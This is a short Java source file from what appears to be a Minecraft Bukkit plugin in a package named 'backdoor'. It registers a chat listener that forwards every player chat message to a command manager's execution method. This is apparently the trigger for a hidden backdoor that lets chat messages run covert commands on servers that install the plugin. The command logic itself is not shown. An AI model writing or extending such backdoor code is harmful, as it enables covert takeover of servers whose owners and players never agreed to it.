package me.thesaltyboys.backdoor;

import me.thesaltyboys.plugin.Main;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class PlayerChat implements Listener {

    private final Main main;

    public PlayerChat(Main main) {
        this.main = main;
    }

    @EventHandler
    public void onEvent(PlayerChatEvent event) {
        main.getCommandManager().onExec(event);
    }
}
